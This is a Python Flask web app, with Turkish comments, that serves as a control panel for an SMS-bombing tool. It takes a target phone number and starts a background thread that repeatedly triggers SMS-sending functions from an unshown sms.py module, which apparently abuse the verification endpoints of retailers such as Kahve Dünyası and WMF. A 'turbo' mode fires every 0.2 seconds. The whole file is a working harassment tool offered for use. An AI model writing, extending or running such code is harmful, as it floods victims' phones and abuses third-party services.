from flask import Flask, render_template_string, request
import threading
import time
import requests
import sms  # sms.py dosyanı bağlar

app = Flask(__name__)
bombardiman_aktif = False

def sms_gonder_dongusu(tel_no, turbo_mod):
    global bombardiman_aktif
    
    # Telefon numarasını 10 haneli formata getirir
    formatli_tel = tel_no[-10:]
    
    # sms.py içindeki SendSms sınıfını başlatır (phone ve mail parametreleriyle)
    servis = sms.SendSms(formatli_tel, "")

    while bombardiman_aktif:
        try:
            # Sınıfın içindeki SMS atan fonksiyonları sırayla tetikler
            servis.KahveDunyasi()
            servis.Wmf()
            # sms.py içine yeni fonksiyonlar eklersen onları da buraya alt alta ekleyebilirsin
            
        except Exception:
            pass
            
        # Hız Ayarı
        bekleme = 0.2 if turbo_mod else 3.0
        time.sleep(bekleme)

HTML_SAYFA = """
<!DOCTYPE html>
<html>
<head>
    <title>DC=theazazil</title>
    <style>
        body { background-color: #0a0a0a; color: #00ff66; font-family: monospace; text-align: center; padding-top: 50px; }
        .box { border: 2px solid #00ff66; display: inline-block; padding: 30px; box-shadow: 0 0 15px #00ff66; background: #111; }
        input, button { background: #000; color: #00ff66; border: 1px solid #00ff66; padding: 10px; margin: 10px; font-size: 16px; }
        button:hover { background: #00ff66; color: #000; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h1>DC=theazazil</h1>
        <form action="/baslat" method="post">
            <input type="text" name="tel" placeholder="Telefon No (10 Hane)" required><br>
            <label><input type="checkbox" name="turbo"> ⚡ TURBO MOD</label><br>
            <button type="submit">BAŞLAT</button>
        </form>
        <form action="/durdur" method="post">
            <button type="submit" style="border-color: red; color: red;">DURDUR (CTRL+C)</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def ana_sayfa(): 
    return render_template_string(HTML_SAYFA)

@app.route('/baslat', methods=['POST'])
def baslat():
    global bombardiman_aktif
    if not bombardiman_aktif:
        tel = request.form.get('tel')
        turbo = 'turbo' in request.form
        bombardiman_aktif = True
        threading.Thread(target=sms_gonder_dongusu, args=(tel, turbo)).start()
    return "Sistem Arka Planda Çalışıyor... <a href='/'>Geri Dön</a>"

@app.route('/durdur', methods=['POST'])
def durdur():
    global bombardiman_aktif
    bombardiman_aktif = False
    return "Sistem Durduruldu. <a href='/'>Geri Dön</a>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
